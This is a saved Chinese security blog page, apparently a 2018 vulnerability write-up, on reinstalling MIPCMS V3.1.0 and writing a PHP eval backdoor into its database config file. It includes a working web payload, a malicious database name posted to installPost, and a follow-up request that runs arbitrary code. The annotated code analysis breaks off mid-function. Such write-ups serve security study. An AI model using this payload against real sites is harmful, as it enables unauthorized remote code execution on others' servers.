@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞) - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过install.lock进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。 想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇ZZCMS 8.2任意文件删除至Getshell的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。
+0x02 环境 程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip Web环境:Deepin Linux&#43;Apache2&#43;PHP5.6&#43;MySQL（192.168.1.101） 远程数据库服务器:Windows 10 x64（192.168.1.102）
+0x03 漏洞利用过程   我们先正常安装程序   在远程数据库服务器上面开启远程访问，然后在上面建立一个名为test&#39;,1=&amp;gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&amp;gt;&#39;数据库。   浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost POST:
+  username=admin&amp;amp;password=admin&amp;amp;rpassword=admin&amp;amp;dbport=3306&amp;amp;dbname=test&amp;#39;,1=&amp;gt;eval(file_get_contents(&amp;#39;php://input&amp;#39;)),&amp;#39;2&amp;#39;=&amp;gt;&amp;#39;&amp;amp;dbhost=192.168.1.102&amp;amp;dbuser=root&amp;amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
+4. 执行代码，具体原理我会在后面构造poc的再详细讲解 浏览器访问：http://www.getpass.test/system/config/database.php POST：phpinfo(); 0x04 框架知识补充 还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003
+首先我们现在thinkPHP的配置文件/system/config/config.php里面修改下面这两个为true 然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个小绿帽，点击就可以看到文件的加载流程。 这里有很多文件会预加载，我们主要看它的路由文件Route.php 我们可以看到，这里检查了install.lock文件存不存在，如果不存在就会跳转到安装的界面进行安装。 0x05 漏洞代码分析过程 /app/install/controller/Install.php问题出现在这个文件，它里面的就在index这里检查的install.lock的存在，但是在installPost这个方法里面却没有检查，也没有做关联，在install.html里面直接就跳过了，从而导致了程序重装。 下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：
+ 一个是遍历数据库内容那里，我输出了$matches截图这个内容给你们好理解。  再一个是配置文件的替换，读到$conf = str_replace(&amp;quot;#{$key}#&amp;quot;, $value, $conf);这句的时候我顺便截图了一个配置的内容。   public function installPost(Request $request) { header(&amp;#39;Access-Control-Allow-Origin: *&amp;#39;); header(&amp;#39;Access-Control-Allow-Credentials: true&amp;#39;); header(&amp;#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&amp;#39;); header(&amp;#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&amp;#39;); if (Request::instance()-&amp;gt;isPost()) {//判断是否有post的数据  $dbconfig[&amp;#39;type&amp;#39;]=&amp;#34;mysql&amp;#34;;//定义数据库类型  $dbconfig[&amp;#39;hostname&amp;#39;]=input(&amp;#39;post." /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)" />
+<meta property="og:description" content="0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过install.lock进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。 想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇ZZCMS 8.2任意文件删除至Getshell的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。
+0x02 环境 程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip Web环境:Deepin Linux&#43;Apache2&#43;PHP5.6&#43;MySQL（192.168.1.101） 远程数据库服务器:Windows 10 x64（192.168.1.102）
+0x03 漏洞利用过程   我们先正常安装程序   在远程数据库服务器上面开启远程访问，然后在上面建立一个名为test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;数据库。   浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost POST:
+  username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
+4. 执行代码，具体原理我会在后面构造poc的再详细讲解 浏览器访问：http://www.getpass.test/system/config/database.php POST：phpinfo(); 0x04 框架知识补充 还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003
+首先我们现在thinkPHP的配置文件/system/config/config.php里面修改下面这两个为true 然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个小绿帽，点击就可以看到文件的加载流程。 这里有很多文件会预加载，我们主要看它的路由文件Route.php 我们可以看到，这里检查了install.lock文件存不存在，如果不存在就会跳转到安装的界面进行安装。 0x05 漏洞代码分析过程 /app/install/controller/Install.php问题出现在这个文件，它里面的就在index这里检查的install.lock的存在，但是在installPost这个方法里面却没有检查，也没有做关联，在install.html里面直接就跳过了，从而导致了程序重装。 下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：
+ 一个是遍历数据库内容那里，我输出了$matches截图这个内容给你们好理解。  再一个是配置文件的替换，读到$conf = str_replace(&quot;#{$key}#&quot;, $value, $conf);这句的时候我顺便截图了一个配置的内容。   public function installPost(Request $request) { header(&#39;Access-Control-Allow-Origin: *&#39;); header(&#39;Access-Control-Allow-Credentials: true&#39;); header(&#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&#39;); header(&#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&#39;); if (Request::instance()-&gt;isPost()) {//判断是否有post的数据  $dbconfig[&#39;type&#39;]=&#34;mysql&#34;;//定义数据库类型  $dbconfig[&#39;hostname&#39;]=input(&#39;post." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/" />
+<meta property="article:published_time" content="2018-03-26T01:09:26+00:00" />
+<meta property="article:modified_time" content="2018-03-26T01:09:26+00:00" />
+<meta itemprop="name" content="MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)">
+<meta itemprop="description" content="0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过install.lock进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。 想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇ZZCMS 8.2任意文件删除至Getshell的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。
+0x02 环境 程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip Web环境:Deepin Linux&#43;Apache2&#43;PHP5.6&#43;MySQL（192.168.1.101） 远程数据库服务器:Windows 10 x64（192.168.1.102）
+0x03 漏洞利用过程   我们先正常安装程序   在远程数据库服务器上面开启远程访问，然后在上面建立一个名为test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;数据库。   浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost POST:
+  username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
+4. 执行代码，具体原理我会在后面构造poc的再详细讲解 浏览器访问：http://www.getpass.test/system/config/database.php POST：phpinfo(); 0x04 框架知识补充 还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003
+首先我们现在thinkPHP的配置文件/system/config/config.php里面修改下面这两个为true 然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个小绿帽，点击就可以看到文件的加载流程。 这里有很多文件会预加载，我们主要看它的路由文件Route.php 我们可以看到，这里检查了install.lock文件存不存在，如果不存在就会跳转到安装的界面进行安装。 0x05 漏洞代码分析过程 /app/install/controller/Install.php问题出现在这个文件，它里面的就在index这里检查的install.lock的存在，但是在installPost这个方法里面却没有检查，也没有做关联，在install.html里面直接就跳过了，从而导致了程序重装。 下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：
+ 一个是遍历数据库内容那里，我输出了$matches截图这个内容给你们好理解。  再一个是配置文件的替换，读到$conf = str_replace(&quot;#{$key}#&quot;, $value, $conf);这句的时候我顺便截图了一个配置的内容。   public function installPost(Request $request) { header(&#39;Access-Control-Allow-Origin: *&#39;); header(&#39;Access-Control-Allow-Credentials: true&#39;); header(&#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&#39;); header(&#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&#39;); if (Request::instance()-&gt;isPost()) {//判断是否有post的数据  $dbconfig[&#39;type&#39;]=&#34;mysql&#34;;//定义数据库类型  $dbconfig[&#39;hostname&#39;]=input(&#39;post.">
+<meta itemprop="datePublished" content="2018-03-26T01:09:26+00:00" />
+<meta itemprop="dateModified" content="2018-03-26T01:09:26+00:00" />
+<meta itemprop="wordCount" content="397">
+
+
+
+<meta itemprop="keywords" content="MIPCMS,Getshell,每日一洞,代码审计," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)"/>
+<meta name="twitter:description" content="0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过install.lock进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。 想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇ZZCMS 8.2任意文件删除至Getshell的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。
+0x02 环境 程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip Web环境:Deepin Linux&#43;Apache2&#43;PHP5.6&#43;MySQL（192.168.1.101） 远程数据库服务器:Windows 10 x64（192.168.1.102）
+0x03 漏洞利用过程   我们先正常安装程序   在远程数据库服务器上面开启远程访问，然后在上面建立一个名为test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;数据库。   浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost POST:
+  username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
+4. 执行代码，具体原理我会在后面构造poc的再详细讲解 浏览器访问：http://www.getpass.test/system/config/database.php POST：phpinfo(); 0x04 框架知识补充 还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003
+首先我们现在thinkPHP的配置文件/system/config/config.php里面修改下面这两个为true 然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个小绿帽，点击就可以看到文件的加载流程。 这里有很多文件会预加载，我们主要看它的路由文件Route.php 我们可以看到，这里检查了install.lock文件存不存在，如果不存在就会跳转到安装的界面进行安装。 0x05 漏洞代码分析过程 /app/install/controller/Install.php问题出现在这个文件，它里面的就在index这里检查的install.lock的存在，但是在installPost这个方法里面却没有检查，也没有做关联，在install.html里面直接就跳过了，从而导致了程序重装。 下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：
+ 一个是遍历数据库内容那里，我输出了$matches截图这个内容给你们好理解。  再一个是配置文件的替换，读到$conf = str_replace(&quot;#{$key}#&quot;, $value, $conf);这句的时候我顺便截图了一个配置的内容。   public function installPost(Request $request) { header(&#39;Access-Control-Allow-Origin: *&#39;); header(&#39;Access-Control-Allow-Credentials: true&#39;); header(&#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&#39;); header(&#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&#39;); if (Request::instance()-&gt;isPost()) {//判断是否有post的数据  $dbconfig[&#39;type&#39;]=&#34;mysql&#34;;//定义数据库类型  $dbconfig[&#39;hostname&#39;]=input(&#39;post."/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)</h1>
+        <p class="post-meta">Mar 26, 2018</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h2 id="0x01-前言">0x01 前言</h2>
+<p>今天翻了下CNVD，看到了一个<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516">MIPCMS</a>的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。
+看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过<code>install.lock</code>进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。
+想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇<a href="http://getpass.cn/2018/03/06/ZZCMS8.2-any-file-deleted-to-getshell/">ZZCMS 8.2任意文件删除至Getshell</a>的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。</p>
+<h2 id="0x02-环境">0x02 环境</h2>
+<p>程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip
+Web环境:Deepin Linux+Apache2+PHP5.6+MySQL（192.168.1.101）
+远程数据库服务器:Windows 10 x64（192.168.1.102）</p>
+<!-- raw HTML omitted -->
+<h2 id="0x03-漏洞利用过程">0x03 漏洞利用过程</h2>
+<ol>
+<li>
+<p>我们先正常安装程序
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms1.png" alt=""></p>
+</li>
+<li>
+<p>在远程数据库服务器上面开启远程访问，然后在上面建立一个名为<code>test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'</code>数据库。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms2.png" alt="">
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms3.png" alt=""></p>
+</li>
+<li>
+<p>浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost
+POST:</p>
+</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&gt;&#39;&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root
+</code></pre></div><p>记得里面的数据库对应上你远程数据库服务器的信息！
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms4.png" alt=""></p>
+<p>可以看到一句把eval函数写到了配置文件里面了</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms6.png" alt="">
+4. 执行代码，具体原理我会在后面构造poc的再详细讲解
+浏览器访问：http://www.getpass.test/system/config/database.php
+POST：<code>phpinfo();</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms5.png" alt=""></p>
+<h2 id="0x04-框架知识补充">0x04 框架知识补充</h2>
+<p>还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003</p>
+<p>首先我们现在thinkPHP的配置文件<code>/system/config/config.php</code>里面修改下面这两个为<code>true</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms10.png" alt=""></p>
+<p>然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个<code>小绿帽</code>，点击就可以看到文件的加载流程。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms11.png" alt="">
+这里有很多文件会预加载，我们主要看它的路由文件<code>Route.php</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms12.png" alt="">
+我们可以看到，这里检查了<code>install.lock</code>文件存不存在，如果不存在就会跳转到安装的界面进行安装。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms13.png" alt=""></p>
+<h2 id="0x05-漏洞代码分析过程">0x05 漏洞代码分析过程</h2>
+<p><code>/app/install/controller/Install.php</code>问题出现在这个文件，它里面的就在index这里检查的<code>install.lock</code>的存在，但是在<code>installPost</code>这个方法里面却没有检查，也没有做关联，在<code>install.html</code>里面直接就跳过了，从而导致了程序重装。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms9.png" alt=""></p>
+<p>下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：</p>
+<ol>
+<li>一个是遍历数据库内容那里，我输出了<code>$matches</code>截图这个内容给你们好理解。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms8.png" alt=""></li>
+<li>再一个是配置文件的替换，读到<code>$conf = str_replace(&quot;#{$key}#&quot;, $value, $conf);</code>这句的时候我顺便截图了一个配置的内容。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms7.png" alt=""></li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">installPost</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Origin: *&#39;</span><span class="p">);</span>
+                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Credentials: true&#39;</span><span class="p">);</span>
+                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&#39;</span><span class="p">);</span>
+                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&#39;</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">Request</span><span class="o">::</span><span class="na">instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">isPost</span><span class="p">())</span> <span class="p">{</span><span class="c1">//判断是否有post的数据
+</span><span class="c1"></span>                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;mysql&#34;</span><span class="p">;</span><span class="c1">//定义数据库类型
+</span><span class="c1"></span>                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;hostname&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbhost&#39;</span><span class="p">);</span><span class="c1">//接受post过来的dbhost的值，然后赋值到$dbconfig的数组里面，下面以此类推
+</span><span class="c1"></span>                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbuser&#39;</span><span class="p">);</span>
+                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbpw&#39;</span><span class="p">);</span>
+                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;hostport&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbport&#39;</span><span class="p">);</span>
+                <span class="nv">$dbname</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.dbname&#39;</span><span class="p">));</span><span class="c1">//这里用了转换小写的函数，所以后面构造poc的时候就不能直接写入一句话木马$_POST了
+</span><span class="c1"></span>                
+                <span class="nv">$username</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.username&#39;</span><span class="p">);</span>
+                <span class="nv">$password</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.password&#39;</span><span class="p">);</span>
+                <span class="nv">$rpassword</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s1">&#39;post.rpassword&#39;</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$username</span><span class="p">)</span> <span class="p">{</span><span class="c1">//判断上面是否有post这个值过来，没有就执行下面的报错，后面的以此类推
+</span><span class="c1"></span>                    <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;请输入用户名&#39;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;请输入密码&#39;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$rpassword</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;请输入重复密码&#39;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="c1">//下面这句是构造PDO的连接方式，如果有不懂的同学可以去了解下，因为这种方式比老的sql执行方式安全
+</span><span class="c1"></span>                <span class="nv">$dsn</span> <span class="o">=</span> <span class="s2">&#34;mysql:dbname=</span><span class="si">{</span><span class="nv">$dbname</span><span class="si">}</span><span class="s2">;host=</span><span class="si">{</span><span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;hostname&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">;port=</span><span class="si">{</span><span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;hostport&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">;charset=utf8&#34;</span><span class="p">;</span>
+                <span class="k">try</span> <span class="p">{</span><span class="c1">//如果有学过Python的同学可以晓得try的方式可以自定义报错信息，可以避免泄露其他的敏感数据库信息
+</span><span class="c1"></span>                    <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\PDO</span><span class="p">(</span><span class="nv">$dsn</span><span class="p">,</span> <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+                <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">\PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nx">jsonError</span><span class="p">(</span><span class="s1">&#39;错误代码:&#39;</span><span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
+                <span class="p">}</span>
+                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;database&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$dbname</span><span class="p">;</span><span class="c1">//把上面post过来的数据库名赋值到数组
+</span><span class="c1"></span>                <span class="nv">$dbconfig</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">trim</span><span class="p">(</span><span class="nx">input</span><span class="p">(</span><span class="s1">&#39;dbprefix&#39;</span><span class="p">));</span><span class="c1">//接受post过来的数据前缀，然后用trim去掉两边的空白字符
+</span><span class="c1"></span>                <span class="nv">$tablepre</span> <span class="o">=</span> <span class="nx">input</span><span class="p">(</span><span class="s2">&#34;dbprefix&#34;</span><span class="p">);</span><span class="c1">//表名前缀
+</span><span class="c1"></span>                <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">PUBLIC_PATH</span><span class="o">.</span><span class="s1">&#39;package&#39;</span><span class="o">.</span><span class="nx">DS</span><span class="o">.</span><span class="s1">&#39;mipcms_v_3_1_0.sql&#39;</span><span class="p">);</span><span class="c1">//读取数据库文件mipcms_v_3_1_0.sql的内容
+</span><span class="c1"></span>                <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span><span class="c1">//把刚读到的内容进行替换操作，&#34;\r&#34;是换行符，&#34;\n&#34;是回车符
+</span><span class="c1"></span>                <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span><span class="c1">//用explode函数以\n区别然后转换为数组形式
+</span><span class="c1"></span>                <span class="nv">$default_tablepre</span> <span class="o">=</span> <span class="s2">&#34;mip_&#34;</span><span class="p">;</span><span class="c1">//定义默认的表名前缀
+</span><span class="c1"></span>                <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34; `</span><span class="si">{</span><span class="nv">$default_tablepre</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34; `</span><span class="si">{</span><span class="nv">$tablepre</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span><span class="c1">//把上面传来的表名前缀替换掉默认的表名前缀
+</span><span class="c1"></span>                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sql</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="c1">//这里有个遍历数组，就是把刚才的数组遍历然后一句一句执行
+</span><span class="c1"></span>                    <span class="nv">$item</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
+                    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
+                    <span class="c1">//这里有个正则匹配，正则总会把对新手弄得云里雾里，其实也不难，这里的意思就是匹配到创建表的语句先执行，然后再执行下面的，要不然会出现错误.
